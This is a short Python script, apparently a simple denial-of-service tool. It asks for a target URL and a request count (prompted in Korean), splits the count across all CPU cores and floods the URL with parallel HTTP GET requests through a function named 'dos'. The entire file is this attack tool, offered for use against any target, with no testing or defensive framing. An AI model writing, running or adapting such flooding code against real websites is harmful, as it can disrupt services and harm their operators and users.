import multiprocessing
import parmap
import requests


def split_number(n, m):
    if m == 1:
        return [n]

    equal = n // m
    left = n - (equal * (m - 1))

    return [equal for i in range(m - 1)] + [left]


def dos(n, url):
    for i in range(n):
        requests.get(url)


if __name__ == '__main__':
    coresCount = multiprocessing.cpu_count()

    target = input('URL: ')

    targetCount = split_number(int(input('횟수: ')), coresCount)

    parmap.map(dos, targetCount, target, pm_pbar=True, pm_processes=coresCount)
